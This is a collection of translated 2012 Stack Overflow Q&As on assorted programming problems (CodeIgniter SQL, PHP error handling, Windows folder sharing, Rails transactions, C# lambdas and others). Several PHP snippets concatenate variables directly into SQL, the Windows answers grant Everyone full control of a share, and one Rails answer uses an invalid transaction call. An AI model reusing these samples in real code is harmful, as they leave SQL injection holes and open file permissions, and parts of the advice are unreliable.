on mt.Category=cat_count.ColumnA 
```

结果：

```
mt.col1 | mt.col2 | Category | Occurrences 
###     | ###     | XXX      | 3
###     | ###     | YYY      | 0
###     | ###     | ZZZ      | 1 
```

# c++ - 找出消耗内存的地方

> ID：11309522
> 
> 赞同：3
> 
> 时间：2012-07-03T11:01:10.170
> 
> 标签：c++, memory, memory-leaks, memory-profiling

我有这个相对较大的数字应用程序代码，可能会运行几天并最终吐出一些数字。整个东西是用 C++ 编写的，利用了一堆 3rd-party 库，并使用 GCC 4.6 编译。该代码始终使用共享指针。

不幸的是，随着时间的推移，代码的内存消耗会增加，直到所有（共享）内存都用完，然后崩溃。从算法上讲，代码不应该随着时间的推移积累内存，所以某处会出现错误。

我确实通过 valgrind 的泄漏检查器运行了一个小例子，它报告一切都应该没问题。我的想法是共享指针可能会在某个地方无意中创建，从而防止在过程中释放不需要的数据（但这只是一个猜测）。

在一天结束的时候，我已经没有想法如何调试这样的东西了。有任何想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-03T11:16:35.847

由于您已经拥有可用的 valgrind 工具套件，我建议您运行*massif*工具。

Massif 将跟踪内存分配来源，并且报告将指示您每个分配站点/函数创建了多少字节。这将帮助您了解内存爆炸的来源。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-17T18:22:26.830

GNU libstdc++ 默认缓存与 STL 相关的内存分配，显然是出于微基准速度的原因。但是，当使用 tcmalloc 和 jemalloc 等分配器时，实际效果往往对速度和内存占用都非常不利。tcmalloc 通过在环境中设置 GLIBCPP_FORCE_NEW=1 和 GLIBCXX_FORCE_NEW=1 来禁用此行为（分别适用于[libstdc++](http://gcc.gnu.org/onlinedocs/libstdc++/manual/bk01pt04ch11.html#allocator.impl)版本 3.3 和 3.4），但我知道没有其他分配器这样做。因此，在启动应用程序时设置适当的环境变量通常是个好主意。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-03T11:29:46.030

即使您没有泄漏，您也可能面临内存碎片。

如果你在 Linux 上，我建议尝试[jemalloc](http://www.canonware.com/jemalloc/download.html)分配器。它在 Linux 上运行良好。它可以在许多架构上运行，我什至在 zLinux（IBM zSeries 大型机上）上也成功使用了它。它真的很容易使用——你甚至不需要重建你的应用程序或任何库，只需构建 jemalloc 并使用`LD_PRELOAD`这样的 set 启动你的应用程序：`LD_PRELOAD=/usr/lib/libjemalloc.so <app>`

# php - 如何在 Codeigniter 中联合 2 个 SQL 查询？

> ID：11309526
> 
> 赞同：0
> 
> 时间：2012-07-03T11:01:35.683
> 
> 标签：php, mysql, codeigniter

> **可能重复：**
> [使用 codeigniter 的活动记录模式的 UNION 查询](https://stackoverflow.com/questions/2040655/union-query-with-codeigniters-active-record-pattern)

我有以下代码：

```
$language_id=$this->get_language_id($language_code);
$english_id=$this->get_language_id('en');
$query="SELECT e.label_value, t.user_id, t.votes, t.approved, t.language_value FROM labels e left outer join labels t on e.label_value=t.label_value WHERE e.language=$english_id and t.language=$language_id and (t.approved=1 or t.user_id=$user_id) and e.label_value in (select distinct label_value from labels  WHERE language=$english_id order by label_value limit $start_index, 30) order by e.label_value, t.votes";
$query=$this->db->query($query);
$data=$query->result_array(); 
```

但我收到以下错误：

```
This version of MySQL doesn't yet support 'LIMIT & IN/ALL/ANY/SOME subquery' 
```

因此，我需要`"select distinct label_value from labels WHERE language=$english_id order by label_value offset $start limit 30"`在另一个查询中执行以下部分。请帮助我，我该如何使用 CodeIgniter 来做到这一点？

更新：

有表`labels`

```
(label_value, language_value, language) - PK,
user_id,
timestamp,
approved,
votes 
```

我需要从此表中获取所有查询（例如，它的名称是 t 和 e），标签为 t.label_value、e.label_value（存在）、e.user_id、e.votes、e.timestamp where t.label_value =e.label_value（相同标签）、t.language=45（英语）、e.language=24（我的语言）和（e.user_id=121234 或 e.approved=1）。但我需要所有条目，如果 (t.label_value!=e.label_value) 我需要使用 NULL 字段获取此条目。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-03T11:07:47.530

这是 MySQL 而不是 PHP 或 CI 的限制。为了绕过它，您需要将子查询包装在别名子查询中，使其成为派生表：

```
$language_id = $this->get_language_id($language_code);
$english_id = $this->get_language_id('en');
$query = "
  SELECT e.label_value, t.user_id, t.votes, t.approved, t.language_value
  FROM labels e
  LEFT OUTER JOIN labels t on e.label_value=t.label_value
  WHERE
    e.language = $english_id
    AND t.language = $language_id
    AND (t.approved = 1 OR t.user_id = $user_id)
    AND e.label_value IN (
      SELECT label_value
      FROM (
        SELECT DISTINCT label_value
        FROM labels
        WHERE language = $english_id
        ORDER BY label_value
        LIMIT $start_index, 30
      ) i
    )
  ORDER BY e.label_value, t.votes
";
$query = $this->db->query($query);
$data = $query->result_array(); 
```

我认为这会起作用，如果不起作用，请告诉我，我会再看一下。

**编辑**

我很难弄清楚你到底想要做什么，但我认为它可能更像是这样：

```
SELECT t.label_value, t.user_id, t.votes, t.approved, t.language_value
FROM (
  SELECT DISTINCT label_value
  FROM labels
  WHERE language = $english_id
) e
LEFT JOIN labels t ON e.label_value = t.label_value
WHERE
  t.language = $language_id
  AND (t.approved = 1 OR t.user_id = $user_id)
ORDER BY t.label_value, t.votes
LIMIT $start_index, 30 
```

如果这仍然不正确，请显示一些示例行，以及您希望从这些行中检索的结果集。

# lucene - Lucene 索引忽略撇号

> ID：11309527
> 
> 赞同：0
> 
> 时间：2012-07-03T11:01:36.403
> 
> 标签：lucene

我有一个可能包含撇号的字段。我希望能够： 1\. 将值按原样存储在索引中 2\. 基于忽略任何撇号的值进行搜索。

我正在考虑使用：

```
 doc.add(new Field("name", value, Store.YES, Index.NO));
   doc.add(new Field("name", value.replaceAll("['‘’`]",""), Store.NO, Index.ANALYZED)); 
```

如果然后我在搜索时进行相同的替换，我想它应该可以工作并使用清除的值来索引/搜索，并将值用于显示。

我在这里错过任何其他注意事项吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-05T17:37:12.487

直接在值上执行`replaceAll`它在 Lucene 中是一种不好的做法，因为将标记化配方封装在`Analyzer`. 此外，我看不到在您的用例中附加字段的好处（请参阅[Document.add](http://lucene.apache.org/core/old_versioned_docs/versions/2_9_0/api/all/org/apache/lucene/document/Document.html#add%28org.apache.lucene.document.Fieldable%29)）。

如果您想存储原始值并且能够在没有撇号的情况下进行搜索，只需像这样声明您的字段：

```
doc.add(new Field("name", value, Store.YES, Index.ANALYZED); 
```

然后简单地连接一个`Tokenizer`将替换撇号的自定义（我认为 Lucene`StandardAnalyzer`已经包含这种转换）。

如果您存储字段的目的是使用突出显示，您还应该考虑使用`Field.TermVector.WITH_POSITIONS_OFFSETS`.

# java - 我们如何更改计时器参数以接受双延迟值而不是 int？

> ID：11309534
> 
> 赞同：0
> 
> 时间：2012-07-03T11:01:49.717
> 
> 标签：java

我是java新手。我正在尝试在指数到达间隔时间（不是整数）收集动态事件。

但是我希望我的“计时器”值是双倍的，有没有其他方法可以让计时器类接受双倍的值？

我尝试使用 Timer ActionListerner，如下所示：

```
double timer = data.getInterArrivalTime(0.5);
    timer1 = new Timer(timer, new DataCollection());
    timer1.start(); 
```

我的 DataCollection 类是：

```
private class DataCollection implements ActionListener
{
    public void actionPerformed(ActionEvent e)
        {

        int eventValue =  data.poisson(25);
        valueListAtOrigin.addLast(eventValue);
        time = time + timer;
        timeListAtOrigin.addLast(time); 

        }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-03T11:08:27.287

计时器最多只能精确到最接近的毫秒。即使您可以设置毫秒的分数，它实际上也不会以这种方式工作。

最简单的方法是使用强制转换将时间四舍五入到最接近`long`的值。

```
timer1 = new Timer((long) timer, new DataCollection()); 
```

* * *

顺便说一句，为了您的兴趣， Object.wait(long millis, int nanos) 的代码是

```
public final void wait(long timeout, int nanos) throws InterruptedException {
    if (timeout < 0) {
        throw new IllegalArgumentException("timeout value is negative");
    }

    if (nanos < 0 || nanos > 999999) {
        throw new IllegalArgumentException(
            "nanosecond timeout value out of range");
    }

if (nanos >= 500000 || (nanos != 0 && timeout == 0)) {
    timeout++;
}

wait(timeout);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-03T11:16:16.897

使用浮点数（float 和 double）而不是整数（int 和 long）是一个常见的错误。在您的场景中，应该使用 int 或 long 来测量时间间隔，例如毫秒。

# php - 错误处理时数据库查询错误

> ID：11309538
> 
> 赞同：0
> 
> 时间：2012-07-03T11:01:52.710
> 
> 标签：php, mysql, error-handling

为了处理错误，我编写了以下代码段。

*（Page.php 通过 : array( falseNamePage=> page.php, ....ect) 包含在索引页面中）*

执行一些测试以查看它的反应，我从 public_html 中删除了 page.php。

结果 ：

-错误记录正常

- 警报电子邮件发送确定

- 在数据库中记录：错误：

**注意**：未定义的变量：第 40 行 /home/.../public_html/index.php 中的 $database

**警告**：mysql_query() 期望参数 2 是资源，在 /home/.../public_html/index.php 第 40 行“无法连接 DB2”中给出 null

我不明白为什么在这种情况下它无法连接到数据库并发回错误。

数据库连接在所有其他情况下都可以正常工作（删除、选择、更新、插入......）

```
function errorHandler($errno, $errstr, $errfile, $errline)
    {
    require_once('connection.php');
    $now = time();
    $date = date("Y-m-d H:i:s",$now);    
    switch ($errno) {
        case E_NOTICE:
        case E_USER_NOTICE:
        case E_DEPRECATED:
        case E_USER_DEPRECATED:
        case E_STRICT:

            ............ 5 first cases code...............

        case E_WARNING:
        case E_USER_WARNING:            

            $message_warning = "Warning : ".$errno." : ".$errstr." : ".$errfile." : ".$errline;
            error_log ( $message_warning ,0);
            $mail = 'my_mail@yahoo.com';  $sujet = $message_warning;  $body_warning = $date." : ".$message_warning;                             
            mail($mail,'=?UTF-8?B?'.base64_encode($sujet).'?=',stripslashes($body_warning));
            $query_warning  =" INSERT INTO errorlog (severity,errno,errstr,errfile,errline,time) 
            VALUES ('WARNING','".$errno."','".$errstr."','".$errfile."','".$errline."','".$date."')";           
            $result_warning = mysql_query($query_warning,$database) or die("impossible to connect with DB2");
                break;

        case E_ERROR:
        case E_USER_ERROR:

       ............... 2 last cases code ..........
    }       
}    
set_error_handler("errorHandler"); 
```

* * *

**最后一个问题是：**

为什么包含错误会回显 4 次？

系统是否尝试 4 次“打开流”？

我做了：

```
function errorHandler($errno, $errstr, $errfile, $errline)
           {
        if     ($errno == E_NOTICE )
        { echo "<br/>".$errno."== E_NOTICE<br/>";}
        if     ($errno == E_USER_NOTICE)
        { echo "<br/>".$errno."== E_USER_NOTICE<br/>";}
        if     ($errno == E_DEPRECATED)
        { echo "<br/>".$errno."== E_DEPRECATED<br/>";}
        if     ($errno == E_USER_DEPRECATED)
        { echo "<br/>".$errno."== E_USER_DEPRECATED<br/>";}
        if     ($errno == E_STRICT)
        { echo "<br/>".$errno."== E_STRICT<br/>";}
        if     ($errno == E_WARNING)
        { echo "<br/>".$errno."== E_WARNING<br/>";}
        if     ($errno == E_USER_WARNING)
        { echo "<br/>".$errno."== E_USER_WARNING<br/>";}
        if     ($errno == E_ERROR)
        { echo "<br/>".$errno."== E_ERROR<br/>";}
        if     ($errno == E_USER_ERROR)
        { echo "<br/>".$errno."== E_USER_ERROR<br/>";}
           }             
           set_error_handler("errorHandler"); 
```

结果 ：

2== E_WARNING

2== E_WARNING

2== E_WARNING

2== E_WARNING

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T11:09:09.853

可能`connection.php`之前已经包含了，所以当您`require_once`在代码中使用时，它**不会**再次包含`connection.php`。然后，`$database`将不会定义变量，您将收到该错误消息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-03T11:04:45.110

当没有函数定义且没有常量定义在`connection.php`使用`require`而不是`require_once`.

第二次调用函数时，变量 $database 将不可用，因为 require_ **once**。这里的设计有点糟糕。

一种解决方案是将 $database 作为常量，因此无论第一次还是第二次包含 connection.php，它都像一个全局变量。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-03T11:11:01.300

您的问题很简单，在我看来，它是 YAPHPB：您在`require_once`函数定义中使用，希望该文件只包含一次 - 以形成函数的主体。

但它不是这样工作的：*每次*都会解析这段代码（嗯，它有点简化，但原因还是一样）函数会被调用。而且因为它是`require_once`，您的文件实际上只会包含一次 - 仅在第一次调用该函数时。所有接下来的调用都将跳过文件的包含，因此不会定义 $database。

修复它的最简单方法是替换`require_once`为`require`. 但我认为这个问题将被涵盖——但没有解决。真正的解决方案是重组您的代码，使您`$database`实际上成为注册表中的记录 - 如果需要，将从该注册表中延迟提取。

有很多方法可以实现这种行为：我们经常为此使用[Zend_Registry](http://framework.zend.com/manual/en/zend.registry.using.html)组件。在[本主题](https://stackoverflow.com/questions/2531168/zend-registry-real-life-examples)中，有一些示例说明如何有效地使用此组件。

# iphone - 我如何知道 GKA 成就是否已完成？

> ID：11309540
> 
> 赞同：2
> 
> 时间：2012-07-03T11:01:56.697
> 
> 标签：iphone, ios, game-center

我已经为我的游戏建立了目标，一切正常，接受在完成任何目标后不再调用目标的部分。

我知道有一个`GKAchievement`“已完成”类的属性，它是一个布尔值，当成就 100% 完成时返回是。

这是在成就 100% 完成时调用的方法，它传递成就标识符 id 并报告 acheeee ：

```
- (void)AchivmentDidAchive:(id)Achivment{
NSString *identifier = Achivment;
NSLog(@"%@",identifier);
self.achivment = [[GKAchievement alloc]initWithIdentifier:identifier];
self.achivment.showsCompletionBanner = YES;

if (!self.achivment.completed) {
    self.achivment.percentComplete = 100;
    NSLog(@"Reproting!");
    [self.achivment reportAchievementWithCompletionHandler: ^(NSError *error)
     {

     }];
}
else {
    NSLog(@"Achivment Completed!");
}   } 
```

我在这里要做的是将完成百分比设置为 100 并在下一次报告它，即希望再次被调用。

但它总是有效......关于如何处理这个问题有更好的主意吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T04:39:13.663

在界面中添加变量和属性：

```
NSMutableDictionary *earnedAchievementCache;

@property (nonatomic, retain)NSMutableDictionary *earnedAchievementCache; 
```

以 .m 为单位：

```
@synthesize earnedAchievementCache;

- (void) submitAchievement: (NSString*) identifier percentComplete: (double) percentComplete
{

if(self.earnedAchievementCache == NULL)
{

    [GKAchievement loadAchievementsWithCompletionHandler: ^(NSArray *scores, NSError *error)
     {
         if(error == NULL)
         {

             NSMutableDictionary* tempCache= [NSMutableDictionary dictionaryWithCapacity: [scores count]];
             for (GKAchievement* score in scores)
             {
                 [tempCache setObject: score forKey: score.identifier];
             }
             self.earnedAchievementCache= tempCache;
             [self submitAchievement: identifier percentComplete: percentComplete];
         }

     }];
}
else
{

    GKAchievement* achievement= [self.earnedAchievementCache objectForKey: identifier];
    if(achievement != NULL)
    {
        if((achievement.percentComplete >= 100.0) || (achievement.percentComplete >= percentComplete))
        {

            achievement= NULL;

        }
        achievement.percentComplete= percentComplete;
    }
    else
    {
        achievement= [[[GKAchievement alloc] initWithIdentifier: identifier] autorelease];
        achievement.percentComplete= percentComplete;

        [self.earnedAchievementCache setObject: achievement forKey: achievement.identifier];
    }
    if(achievement!= NULL)
    {
        //Submit the Achievement...

        if (achievement.percentComplete>=100) {
           //show banner
            achievement.showsCompletionBanner = YES; //only in IOS 5+
        }

[achievement reportAchievementWithCompletionHandler: ^(NSError *error)
         {
    if (error!=NULL){
            NSLog(@"Error!!");
    } else NSLog(@"all is well");

         }];
    }
}

} 
```

在 dealloc 中：

```
[self.earnedAchievementCache release]; 
```

我正在使用缓存不提交已经提交/完成的分数

PS：代码是完美的，只需将其复制并粘贴到您的课程中即可

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-08T23:15:54.197

这是我在我的助手 Game Center 类中使用的：

```
-(void) reportAchievementWithID:(NSString*) AchievementID {

[GKAchievement loadAchievementsWithCompletionHandler:^(NSArray *achievements, NSError *error) {

    if(error) NSLog(@"error");

    for (GKAchievement *ach in achievements) {
        if([ach.identifier isEqualToString:AchievementID]) { //already submitted
            NSLog(@"Already submitted");
            return ;
        }
    }

    GKAchievement *achievementToSend = [[GKAchievement alloc] initWithIdentifier:AchievementID];
    achievementToSend.percentComplete = 100;
    achievementToSend.showsCompletionBanner = YES;
    [achievementToSend reportAchievementWithCompletionHandler:NULL];

}];

} 
```

注意：我在我的成就中不使用百分比，所以如果你这样做，你需要稍微修改一下。

# c# - 在 ASP.Net 的下拉列表中动态填充和设置值

> ID：11309545
> 
> 赞同：1
> 
> 时间：2012-07-03T11:02:07.587
> 
> 标签：c#, asp.net

我有一个表格，其中有 4 个下拉列表 Country、State、District 和 City。国家/地区在表单加载时填充，其余部分在选定的索引更改事件上填充。序列是 On Country 的选定索引更改状态被填充。在州-> 人口稠密的地区和地区-> 城市上人口稠密。

为了保存它工作正常，但是当我更新值时，它显示空引用错误。在调试时，没有填充下拉菜单，而我正在尝试设置值。下面是我的代码。

```
using (var manager = new LocationManager())
        {
            var dt = manager.GetLocationById(i);
            if (dt.Rows.Count == 1)
            {
                Countries.SelectedValue = Countries.Items.FindByText(dt.Rows[0]["Country"].ToString()).Value;
                BindStates(Convert.ToInt32(Countries.SelectedItem.Value));

                States.SelectedValue = States.Items.FindByText(dt.Rows[0]["State"].ToString()).Value;
                BindDistricts(Convert.ToInt32(States.SelectedItem.Value));

                Districts.SelectedValue = Districts.Items.FindByText(dt.Rows[0]["District"].ToString()).Value;
               BindCities(Convert.ToInt32(Districts.SelectedItem.Value));

                Cities.SelectedValue = Cities.Items.FindByText(dt.Rows[0]["City"].ToString()).Value;
                Pincode.Text = dt.Rows[0]["Pincode"].ToString();

                ViewState["Id"] = dt.Rows[0]["LocationId"].ToString();

            }
        } 
```

我收到错误：{“对象引用未设置为对象的实例。”} 在方法

> BindStates(Convert.ToInt32(Countries.SelectedItem.Value));

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-03T11:03:44.387

检查 Country.SelectedItem != null

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-03T11:11:22.897

@Amit Ranjan：绑定页面初始化方法中的所有值，并在页面加载时为所有下拉菜单选择特定值：

你得到空引用，因为没有值已经绑定到下拉列表。

在页面初始化将所有值绑定到下拉印度美国英国 asp:DropDownList>

页面加载时

```
DropDownList .SelectedValue= dt.Rows[0]["Country"].ToString()).Value; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-03T12:27:31.103

我认为问题不在于下拉列表的数量，而在于找到值，当

```
Countries.Items.FindByText(dt.Rows[0]["Country"].ToString()) 
```

找不到任何匹配的值，它将返回 null。因此，在 null 上应用 'Value' 属性会给出错误。

您可以在选择它之前进行空检查。如下所示：

```
countryDropDown.SelectedValue = countryDropDown.Items.FindByText(dt.Rows[0]["Country"].ToString()) != null ? countryDropDown.Items.FindByText(dt.Rows[0]["Country"].ToString()).Value : countryDropDown.Items.FindByText("-Please select-").Value; 
```

# windows - 使用注册表项共享文件夹

> ID：11309546
> 
> 赞同：0
> 
> 时间：2012-07-03T11:02:08.770
> 
> 标签：windows, cmd, directory, share

我在谷歌上搜索了几天以找到一种通过命令行共享文件夹的方法（在 Windows Xp、Vista 和 7 中）。我想我已经尝试了互联网上所有可用的代码：我可以共享一个文件夹但不能写入它，因为我无法获得“每个人”用户的写/读权限。

我在想也许有一种方法可以通过更改与该文件夹相关的注册表项来共享文件夹。

你听说过这样的事吗？可能吗？？还有其他提示吗？

**已解决**：我首先使用了 NET SHARE 命令（对于 Windows Vista、7 和 8，使用 /GRANT:Evryone，FULL，但在 XP 中不使用，因为 XP 中不存在这样的权限），然后使用 CALCS 命令，如下所示：

```
NET SHARE shared=C:\shared /GRANT: everyone,FULL

CACLS C:\shared /E /T /C /G "everyone":F 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T11:11:37.223

您可以使用此与 cmd 共享文件夹

```
net share MyShare=C:\FolderToShare 
```

要设置权限，您可以使用此

```
cacls C:\FolderToShare /g Everyone:F 
```

或者键入此以跳过确认

```
echo y| cacls C:\FolderToShare /g Everyone:F 
```

这将`Everyone`完全控制文件夹。键入`cacls /?`cmd 以获取权限选项列表。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-03T11:10:52.537

您是否厌倦了使用该`net share`命令？

[https://www.microsoft.com/resources/documentation/windows/xp/all/proddocs/en-us/net_share.mspx?mfr=true](https://www.microsoft.com/resources/documentation/windows/xp/all/proddocs/en-us/net_share.mspx?mfr=true)

> **例子**
> 
> 要显示有关计算机上共享资源的信息，请键入：
> 
> 净份额
> 
> 要使用共享名称 DataShare 共享计算机的 C:\Data 目录并包含备注，请键入：
> 
> `net share DataShare=c:\Data /remark:"For department 123."`
> 
> 要停止共享您在上一个示例中创建的 DataShare 文件夹，请键入：
> 
> `net share DataShare /delete`
> 
> 要使用共享名称 List 共享计算机的 C:\Art Lst 目录，请键入：
> 
> `net share list="c:\art lst"`

**授予访问权限**

这篇文章讨论了默认为只读访问或所有人完全访问的不同版本的 Windows 服务器，因此`/grant`如果在 Windows 2003 上运行，您可以使用该开关

[http://www.edugeek.net/forums/windows/3190-command-line-tool-share-permissions.html](http://www.edugeek.net/forums/windows/3190-command-line-tool-share-permissions.html)

> `NET SHARE share$=<filepath> /GRANT:user,permission`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-03T13:49:11.883

If you have Visual Studio installed you can try writing a small VB application to accomplish this task. If your main application is not a VB application you could "shell" out to the helper app to create the share on your behalf.

[http://vbnet.mvps.org/index.html?code/network/netshareadd.htm](http://vbnet.mvps.org/index.html?code/network/netshareadd.htm)

# javascript - 单击，下载文件并直接到另一个页面

> ID：11309553
> 
> 赞同：1
> 
> 时间：2012-07-03T11:02:26.293
> 
> 标签：javascript, jquery, html, href

我正在寻找允许我执行以下操作的 javascript：

1-创建一个链接：[a href=...

2- 指向下载文件的链接：domain.com/download/?id=100

3-一旦用户点击链接（#1）

4-下载开始并直接到另一个页面

无论如何我可以在没有任何插件的情况下做到这一点，只需一些 javascript 以及如何？

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-03T11:07:13.807

你试过什么。

但我也会给你指路。

1.  创建下载链接`<a href="download file.zip" onclick="redirect">Download</a>`

2.  编写一个js函数：

    `function redirect(){ setTimeout(function(){ window.location.href="new url"; }, 3000); return true; }`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-03T11:09:00.640

1- [http://api.jquery.com/append/](http://api.jquery.com/append/) 3 - 再次使用[http://api.jquery.com/append/](http://api.jquery.com/append/)附加 iframe 并使用 PHP 设置文件头来下载文件类型和回显文件内容。 .. 4\. window.location();

# sql - Rails has_many 清除方法

> ID：11309555
> 
> 赞同：1
> 
> 时间：2012-07-03T11:02:29.473
> 
> 标签：sql, ruby-on-rails, ruby, activerecord, has-many

根据[文档](http://guides.rubyonrails.org/association_basics.html#has_many-association-reference)Rails`has_many`协会有`clear`方法。看起来它在执行`delete`后立即执行 sql 查询。是否有一种规范的方法来删除所有子对象并仅在`save`方法时更新关联？例如：

```
@cart.container_items.delete_all_example # looks like `clear` execute sql at this line
if @cart.save
  # do smth
else
  #do smth
end 
```

这是必要的，因为父对象的许多更改必须全部提交或不提交。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-03T11:05:43.487

你不想`delete_all`，你想`destroy_all`。

调用`delete_all`执行一个简单的 SQL `delete`，忽略任何回调和相关记录。

Using`destroy_all`调用`destroy`每个对象上的方法，允许`:dependent => :destroy`按预期工作，清理子记录。

这不会*破坏*点处的所有对象`save`，并且没有规范的方法可以做到这一点，因为您没有*保存*记录。Rails 在方法调用时持续销毁，而不是在稍后的`save`. 如果您需要许多销毁是事务性的，请将它们包装在一个事务中：

```
Cart.begin do
  @cart.container_items.delete_all_example
end 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-03T15:17:12.840

试试这个：

```
Cart.transaction do
  @cart.container_items.delete_all_example # looks like `clear` execute sql at this line
  if @cart.save
    # success
  else
    # error
    raise ActiveRecord::Rollback
  end
end 
```

`ActiveRecord::Rollback`不会在事务块之外传播。它只是终止事务。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-03T11:41:37.223

看起来我正在尝试做一个`transaction`. 一些文章可以进一步了解它：

*   [Rails 中的转换](http://markdaggett.com/blog/2011/12/01/transactions-in-rails/)
*   [活动记录交易](http://api.rubyonrails.org/classes/ActiveRecord/Transactions/ClassMethods.html)

# c# - 使用条件（三元）运算符分配 lambda 表达式

> ID：11309557
> 
> 赞同：22
> 
> 时间：2012-07-03T11:02:32.740
> 
> 标签：c#, lambda

我正在尝试使用条件（三元）运算符将正确的 lambda 表达式分配给变量，具体取决于条件，但我得到编译器错误：*无法确定条件表达式的类型，因为 'lambda 表达式之间没有隐式转换' 和 'lambda 表达式'*。我可以使用常规的 if-else 来解决这个问题，但是条件运算符对我来说更有意义（在这种情况下），会使代码更简洁添加，至少，我想知道它不这样做的原因不工作。

```
// this code compiles, but is ugly! :)
Action<int> hh;
if (1 == 2) hh = (int n) => Console.WriteLine("nope {0}", n);
else hh = (int n) => Console.WriteLine("nun {0}", n);

// this does not compile
Action<int> ff = (1 == 2)
  ? (int n) => Console.WriteLine("nope {0}", n)
  : (int n) => Console.WriteLine("nun {0}", n); 
```

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2012-07-03T11:05:05.857

C# 编译器尝试独立创建 lambda，并且无法明确确定类型。强制转换可以通知编译器使用哪种类型：

```
Action<int> ff = (1 == 2)
  ? (Action<int>)((int n) => Console.WriteLine("nope {0}", n))
  : (Action<int>)((int n) => Console.WriteLine("nun {0}", n)); 
```

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2012-07-03T11:04:04.343

这将起作用。

```
Action<int> ff = (1 == 2)
? (Action<int>)((int n) => Console.WriteLine("nope {0}", n))
: (Action<int>)((int n) => Console.WriteLine("nun {0}", n)); 
```

**这里有两个问题**

1.  表达
2.  三元运算符

**1\. 表达问题**

编译器准确地告诉你出了什么问题 - `'Type of conditional expression cannot be determined because there is no implicit conversion between 'lambda expression' and 'lambda expression'`。

这意味着您编写的是 lambda 表达式，结果变量也是 lambda 表达式。

lambda 表达式没有任何特定类型 - 它只是可转换为表达式树。

成员访问表达式（这是您尝试做的）仅在表单中可用

```
primary-expression . identifier type-argument-list(opt)
predefined-type . identifier type-argument-list(opt)
qualified-alias-member . identifier type-argument-list(opt) 
```

...并且 lambda 表达式不是主要表达式。

**2\. 三元运算符的问题**

如果我们这样做

```
bool? br = (1 == 2) ? true: null; 
```

这会导致错误说与您的完全一样。`'Type of conditional expression cannot be determined because there is no implicit conversion between 'bool' and '<null>'`

但是如果我们这样做，错误就消失了

```
bool? br = (1 == 2) ? (bool?)true: (bool?)null; 
```

一侧的铸造也将起作用

```
bool? br = (1 == 2) ? (bool?)true: null; 
```

或者

```
bool? br = (1 == 2) ? true: (bool?)null; 
```

对于您的情况

```
Action<int> ff = (1 == 2)
? (Action<int>)((int n) => Console.WriteLine("nope {0}", n))
: ((int n) => Console.WriteLine("nun {0}", n)); 
```

或者

```
Action<int> ff = (1 == 2)
? ((int n) => Console.WriteLine("nope {0}", n))
: (Action<int>)((int n) => Console.WriteLine("nun {0}", n)); 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2012-07-03T11:14:23.777

事实上，通过类型推断，您可以：

*   使用 var 作为局部变量
*   只转换三元运算符的第一个表达式
*   省略 lambda 参数的类型，因为它可以被推断出来

结果更加简洁。（我让你决定它是否更具可读性。）

```
 var ff = condition 
             ? (Action<int>)(n => Console.WriteLine("nope {0}", n)) 
             : n => Console.WriteLine("nun {0}", n); 
```

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2012-07-03T11:09:33.730

与其他人的答案基本相同，形式不同

```
Action<int> ff = (1 == 2) 
? new Action<int>(n => Console.WriteLine("nope {0}", n)) 
: new Action<int>(n => Console.WriteLine("nun {0}", n)); 
```

# wcf - 周末后托管的 WCF 服务挂起

> ID：11309559
> 
> 赞同：0
> 
> 时间：2012-07-03T11:02:35.540
> 
> 标签：wcf, spring.net, freeze

我们有一个托管在 Windows 服务中的 WCF 服务，该服务在长时间不活动后挂起：即周末之后。

这种行为发生在不同的位置。

该服务使用设置为使用传输安全性的 WSHttpBinding 以及使用 Windows 身份验证的自定义 serviceAuthorization 授权策略。

使用 Spring 框架。Spring.ServiceModel.Activation.ServiceHostFactory 创建服务主机。

服务限制设置为 200 个会话、实例和调用。该系统最多有 15 个用户。

跟踪已启用并设置为警告，这应该让我知道油门问题。服务跟踪日志中没有消息。事件日志中没有看起来相关的消息。HTTPPerf 日志中没有相关日志。我们在服务器端应用程序中大量记录，但系统挂起时没有记录任何活动。当系统挂起时，它是一个完全的黑匣子。

客户端失败并显示以下消息。08:13:32.014 [1] 错误应用程序 - System.TimeoutException：客户端无法在配置的超时 (00:00:59.9941374) 内完成安全协商。当前的谈判腿是 1 (00:00:59.9863206)。---> System.TimeoutException：请求通道在 00:00:59.9628702 之后等待回复时超时。增加传递给 Request 调用的超时值或增加 Binding 上的 SendTimeout 值。分配给此操作的时间可能是较长超时的一部分。---> System.TimeoutException：对“http://localhost:8080/OrderManagementService.svc”的 HTTP 请求已超过分配的超时 00:00:59.9690000。分配给此操作的时间可能是较长超时的一部分。---> System.Net.WebException：

我花了很多时间搜索这方面的相关信息。

我不认为这与不活动超时有关，因为这应该记录在跟踪日志中。

我能想到的唯一事情与 Active Directory 凭据缓存或类似性质的事情有关，或者与 Spring 框架的使用有关。

任何帮助将不胜感激。

我正在考虑完全放弃 WSHttpBinding 或 WCF，因为这是不可接受的情况。

服务端配置如下。

```
<system.serviceModel>
<bindings>
  <wsHttpBinding>
